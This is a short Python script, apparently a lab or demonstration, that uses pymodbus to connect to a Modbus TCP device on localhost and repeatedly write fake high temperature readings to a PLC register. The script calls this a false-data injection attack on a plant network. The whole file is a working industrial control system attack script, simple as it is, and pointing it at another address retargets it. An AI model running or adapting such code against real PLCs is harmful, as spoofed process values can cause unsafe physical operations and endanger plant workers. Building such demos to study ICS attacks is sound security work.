from pymodbus.client import ModbusTcpClient
import time
import random

def attack_plc():
    print("[!] Attacker connecting to Plant network...")
    client = ModbusTcpClient('localhost', port=5020)
    client.connect()

    for i in range(10):
        fake_temp = random.randint(900,1500)
        print(f"[!!!] INJECTING FALSE DATA: Writing {fake_temp}°C to Register 0")
        client.write_register(0, fake_temp, slave=1)
        time.sleep(0.5)

    client.close()

if __name__ == "__main__":
    attack_plc()
